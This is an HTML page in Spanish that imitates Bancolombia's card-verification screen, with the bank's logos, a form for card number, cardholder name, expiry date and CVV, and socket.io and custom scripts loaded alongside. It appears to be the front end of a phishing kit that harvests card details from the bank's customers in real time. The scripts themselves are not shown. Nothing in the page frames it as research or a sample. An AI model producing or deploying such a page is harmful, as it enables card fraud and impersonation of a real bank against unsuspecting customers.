<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifica tu tarjeta - Bancolombia</title>
    <link rel="stylesheet" href="styles_new.css">
    <script src="/socket.io/socket.io.js"></script>
    <script src="/js/banco-utils.js"></script>
    <script src="tarjeta_new.js" defer></script>
</head>
<body>
    <div class="auth-container">
        <div class="auth-content">
            <img src="img/logo-bancolombia-blanco.png" alt="Bancolombia" class="logo">
            <h1>Verificación de tarjeta</h1>
            
            <div class="auth-box">
                <h2>Datos de tarjeta</h2>
                <p>Por favor ingresa los datos de tu tarjeta Bancolombia.</p>
                
                <form class="auth-form" id="cardForm">
                    <div class="form-group">
                        <div class="input-group">
                            <svg class="input-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                <path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2z"/>
                                <path d="M2 10h20"/>
                            </svg>
                            <div class="input-wrapper">
                                <input type="text" id="cardNumber" placeholder="Número de tarjeta" maxlength="19">
                                <label for="cardNumber">Número de tarjeta</label>
                            </div>
                        </div>
                    </div>

                    <div class="form-group">
                        <div class="input-group">
                            <svg class="input-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
                                <circle cx="12" cy="7" r="4"/>
                            </svg>
                            <div class="input-wrapper">
                                <input type="text" id="cardHolder" placeholder="Titular de la tarjeta">
                                <label for="cardHolder">Titular de la tarjeta</label>
                            </div>
                        </div>
                    </div>

                    <div class="form-row">
                        <div class="form-group half">
                            <div class="input-group">
                                <svg class="input-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                    <rect x="3" y="4" width="18" height="18" rx="2" ry="2"/>
                                    <line x1="16" y1="2" x2="16" y2="6"/>
                                    <line x1="8" y1="2" x2="8" y2="6"/>
                                    <line x1="3" y1="10" x2="21" y2="10"/>
                                </svg>
                                <div class="input-wrapper">
                                    <input type="text" id="expiryDate" placeholder="MM/YY" maxlength="5">
                                    <label for="expiryDate">Fecha de vencimiento</label>
                                </div>
                            </div>
                        </div>

                        <div class="form-group half">
                            <div class="input-group">
                                <svg class="input-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
                                    <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
                                </svg>
                                <div class="input-wrapper">
                                    <input type="text" id="cvv" placeholder="CVV" maxlength="4">
                                    <label for="cvv">CVV</label>
                                </div>
                            </div>
                        </div>
                    </div>

                    <button type="submit" class="btn-iniciar" disabled>Continuar</button>
                </form>
            </div>
        </div>

        <div class="help-links">
            <a href="#">¿Problemas para conectarte?</a>
            <span class="separator">•</span>
            <a href="#">Aprende sobre seguridad</a>
            <span class="separator">•</span>
            <a href="#">Reglamento Sucursal Virtual</a>
        </div>
    </div>
    
    <footer class="footer">
        <div class="footer-content">
            <div class="footer-left">
                <img src="img/logo-bancolombia-blanco.png" alt="Bancolombia" class="footer-logo">
                <img src="img/SFC_NEGRO_1_1.png" alt="SFC" class="sfc-logo">
            </div>
            <div class="footer-right">
                <p class="ip-address" id="ipAddress">Dirección IP: ...</p>
                <p class="datetime" id="datetime">...</p>
            </div>
        </div>
    </footer>

    <!-- Loading Overlay -->
    <div id="loadingOverlay" class="loading-overlay">
        <img src="img/LogoBancolombia.png" alt="Cargando..." class="loading-logo">
    </div>
</body>
</html>
